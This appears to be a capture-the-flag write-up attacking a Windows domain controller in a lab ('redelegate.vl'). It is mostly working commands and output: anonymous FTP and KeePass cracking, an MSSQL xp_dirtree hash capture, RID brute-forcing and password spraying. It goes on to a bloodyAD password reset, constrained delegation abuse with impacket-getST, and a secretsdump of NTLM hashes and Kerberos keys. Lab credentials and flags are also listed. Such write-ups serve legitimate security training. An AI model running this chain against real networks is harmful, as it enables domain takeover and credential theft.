# 10.129.234.50
- Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl)

## NMAP
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-08 19:59:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-08T19:57:05
|_Not valid after:  2056-01-08T19:57:05
|_ssl-date: 2026-01-08T20:00:19+00:00; -1s from scanner time.
| ms-sql-info:
|   10.129.234.50:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.129.234.50:1433:
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-01-07T19:54:41
|_Not valid after:  2026-07-09T19:54:41
|_ssl-date: 2026-01-08T20:00:19+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-08T20:00:11+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.234.50:49932:
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ms-sql-info:
|   10.129.234.50:49932:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-08T19:57:05
|_Not valid after:  2056-01-08T19:57:05
|_ssl-date: 2026-01-08T20:00:19+00:00; -1s from scanner time.
56995/tcp open  msrpc         Microsoft Windows RPC
58229/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58230/tcp open  msrpc         Microsoft Windows RPC
58231/tcp open  msrpc         Microsoft Windows RPC
58235/tcp open  msrpc         Microsoft Windows RPC
58236/tcp open  msrpc         Microsoft Windows RPC
58242/tcp open  msrpc         Microsoft Windows RPC
63659/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
#### INTERESTING
- 21 - anon FTP login
- 80 - need enum
- 1433 - prolly creds needed
- 3389 - prolly creds needed
- 5985 - prolly creds needed
- 47001 - not reachable http server
- 49932 - mssql again

## Creds
```
keepass:Fall2024!
ftpuser:SguPZBKdRyxWzvXRWy6U
FS01-Administrator:Spdv41gg4BlBgSYIW1gF
Wordpress:cn4KOEgsHqvKXPjEnSD9
sqlguest:zDPBpaF4FywlqIv11vii
```
- Mallory.Roberts - account disabled

## FootHold
- anonymous ftp shows 3 files
- **ALWAYS DOWNLOAD IN BINARY MODE**
1. PenTest todo list
    - unused objects in AD
    - unchecked ACLs
2. employee awareness
    - found a potential password type (SeasonYear!)
3. shared.kdbx not cracked using rockyou.txt (taking a lot of time)
- based on the potential passwords, we can create the following list:
    - use 2024 as the files mention 2024
```
Summer2024!
Spring2024!
Fall2024!
Winter2024!
Autumn2024!
```
- Fall2024! works for the kdbx file and we get some creds
- sqlguest creds work.
- `impacket-mssqlclient REDELEGATE.VL/'sqlguest':@10.129.234.50`
- `xp_dirtree \\10.10.14.246\share` and received hash on responder.
    - couldnt crack
- no linked server or logins
- using msfconsole - `auxiliary/admin/mssql/mssql_enum_domain_accounts`
**OR**
- `nxc mssql 10.129.234.50 -u SQLGuest -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute`
```
MSSQL       10.129.234.50   1433   DC               498: REDELEGATE\Enterprise Read-only Domain Controllers
MSSQL       10.129.234.50   1433   DC               500: WIN-Q13O908QBPG\Administrator
MSSQL       10.129.234.50   1433   DC               501: REDELEGATE\Guest
MSSQL       10.129.234.50   1433   DC               502: REDELEGATE\krbtgt
MSSQL       10.129.234.50   1433   DC               512: REDELEGATE\Domain Admins
MSSQL       10.129.234.50   1433   DC               513: REDELEGATE\Domain Users
MSSQL       10.129.234.50   1433   DC               514: REDELEGATE\Domain Guests
MSSQL       10.129.234.50   1433   DC               515: REDELEGATE\Domain Computers
MSSQL       10.129.234.50   1433   DC               516: REDELEGATE\Domain Controllers
MSSQL       10.129.234.50   1433   DC               517: REDELEGATE\Cert Publishers
MSSQL       10.129.234.50   1433   DC               518: REDELEGATE\Schema Admins
MSSQL       10.129.234.50   1433   DC               519: REDELEGATE\Enterprise Admins
MSSQL       10.129.234.50   1433   DC               520: REDELEGATE\Group Policy Creator Owners
MSSQL       10.129.234.50   1433   DC               521: REDELEGATE\Read-only Domain Controllers
MSSQL       10.129.234.50   1433   DC               522: REDELEGATE\Cloneable Domain Controllers
MSSQL       10.129.234.50   1433   DC               525: REDELEGATE\Protected Users
MSSQL       10.129.234.50   1433   DC               526: REDELEGATE\Key Admins
MSSQL       10.129.234.50   1433   DC               527: REDELEGATE\Enterprise Key Admins
MSSQL       10.129.234.50   1433   DC               553: REDELEGATE\RAS and IAS Servers
MSSQL       10.129.234.50   1433   DC               571: REDELEGATE\Allowed RODC Password Replication Group
MSSQL       10.129.234.50   1433   DC               572: REDELEGATE\Denied RODC Password Replication Group
MSSQL       10.129.234.50   1433   DC               1000: REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
MSSQL       10.129.234.50   1433   DC               1002: REDELEGATE\DC$
MSSQL       10.129.234.50   1433   DC               1103: REDELEGATE\FS01$
MSSQL       10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL       10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL       10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
MSSQL       10.129.234.50   1433   DC               1107: REDELEGATE\Michael.Pontiac
MSSQL       10.129.234.50   1433   DC               1108: REDELEGATE\Mallory.Roberts
MSSQL       10.129.234.50   1433   DC               1109: REDELEGATE\James.Dinkleberg
MSSQL       10.129.234.50   1433   DC               1112: REDELEGATE\Helpdesk
MSSQL       10.129.234.50   1433   DC               1113: REDELEGATE\IT
MSSQL       10.129.234.50   1433   DC               1114: REDELEGATE\Finance
MSSQL       10.129.234.50   1433   DC               1115: REDELEGATE\DnsAdmins
MSSQL       10.129.234.50   1433   DC               1116: REDELEGATE\DnsUpdateProxy
MSSQL       10.129.234.50   1433   DC               1117: REDELEGATE\Ryan.Cooper
MSSQL       10.129.234.50   1433   DC               1119: REDELEGATE\sql_svc
```
- get users in one file and try spraying above passwords
    - `redelegate.vl\Marie.Curie:Fall2024!`
- Running bloodhound
- marie can change password for `helen.frost`
1. `bloodyAD --dc-ip 10.129.234.50 -d redelegate.vl -u marie.curie -p 'Fall2024!' set password helen.frost Haller@123`

- now winrm using helen.frost to get user.txt - 833bc436658855addecea1750f6b4d9e

## PrivEsc
- helen has `SeEnableDelegationPrivilege`
- part of IT group that has `GenericAll` over `FS01`
- Trying Resource-Based Constrained Delegation
    - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html?highlight=SeEnableDelegationPrivilege#abusing-unconstrained-delegation-with-an-attacker-created-computer
    - Obisidan 13. AD>Misc > Resource-Based Constraint Delegation

- no machineaccountquota. so we cant add our own machines but we can use fs01
**Analysis**:
MachineAccountQuota = 0 means we CANNOT create new computer accounts
This rules out Unconstrained Delegation (which requires creating a fake computer)
We also cannot set DNS entries (no PTR/Host-A records)

### ✅ Solution: Constrained Delegation via Existing Account FS01$
Why FS01$?
- Helen.Frost has GenericAll on FS01$ (from BloodHound)
- We have SeEnableDelegationPrivilege (from whoami /priv)
- FS01$ is an existing computer account (no need to create one)
- We can change FS01$'s password (GenericAll permission)
- We can configure delegation settings (SeEnableDelegationPrivilege)

Attack Plan:
- Change FS01$'s password to something we control
- Enable "Trusted to Authenticate for Delegation" on FS01$
- Add an SPN (ldap/dc.redelegate.vl) to FS01$'s delegation targets
- Use FS01$ to request a service ticket impersonating the DC computer account
- Use that ticket to dump domain secrets

```
# Control FS01$
bloodyAD --dc-ip 10.129.234.50 -d redelegate.vl -u helen.frost -p 'Haller@123' set password 'FS01$' 'Passer@123'

ON DC$:
# Configure Constrained Delegation
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
- Sets the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag on FS01$, allowing it to use S4U2Proxy protocol extension.

# Add SPN for Delegation Target
Set-ADObject -Identity "CN=FS01,CN=Computers,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo" = "ldap/dc.redelegate.vl"}
- Adds "ldap/dc.redelegate.vl" to the msDS-AllowedToDelegateTo attribute
- This means FS01$ can now impersonate ANY user to the LDAP service on dc.redelegate.vl
- LDAP is crucial because tools like secretsdump use LDAP (via DRSUAPI) to dump domain secrets

# Verify the above delegation
Get-ADComputer FS01$ -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo | Select TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
OR
impacket-findDelegation -dc-ip 10.129.234.50 redelegate.vl/helen.frost:'Haller@123'

# Request Service Ticket
impacket-getST 'redelegate.vl/FS01$:Passer@123' -spn ldap/dc.redelegate.vl -impersonate dc
**DID NOT WORK**
impacket-getST 'redelegate.vl/FS01$:Passer@123' -spn ldap/dc.redelegate.vl -impersonate Administrator
- checking bloodhound output, we can see Administrator has flag `CannotBeDelegated:True`
- Click on `Domain Admins` in BloodHound and then open Group Membership to find Ryan.Cooper.
impacket-getST 'redelegate.vl/FS01$:Passer@123' -spn ldap/dc.redelegate.vl -impersonate ryan.cooper

# Dump secrets
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
impacket-secretsdump -k -no-pass dc.redelegate.vl

```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:1c1b65c5f1966ad939004b4f1ece5989:::
Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2716d39cc76e785bd445ca353714854d:::
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:76a96946d9b465ec76a4b0b316785d6b:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
FS01$:1103:aad3b435b51404eeaad3b435b51404ee:ce07bda63150c29ba4ee5f767504b01d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
Christine.Flanders:des-cbc-md5:8980267623df2637
Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
Marie.Curie:des-cbc-md5:256889c8bf678910
Helen.Frost:aes256-cts-hmac-sha1-96:5a04bb73516c63a92a878cd59b0a9079dc541d243f8d1102d9ea75304d615baf
Helen.Frost:aes128-cts-hmac-sha1-96:08fe5a42152dda0816c42777b60d9cc7
Helen.Frost:des-cbc-md5:b6581f5bce34ea08
Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
Michael.Pontiac:des-cbc-md5:833dc82fab76c229
Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
Mallory.Roberts:des-cbc-md5:cb25a726ae198686
James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
sql_svc:des-cbc-md5:970d6115d3f4a43b
DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
DC$:des-cbc-md5:3db913751c434f61
FS01$:aes256-cts-hmac-sha1-96:2310a9f975b608039a05738e3fdea372c01968d9fafadd3484c3827f493724cd
FS01$:aes128-cts-hmac-sha1-96:2d16abddfebcf06aa765b773c6a85038
FS01$:des-cbc-md5:2cb96440a72cb9e9
```
- winrm to get root - 7830a2d5a2aeefa8084381f63617f8b9
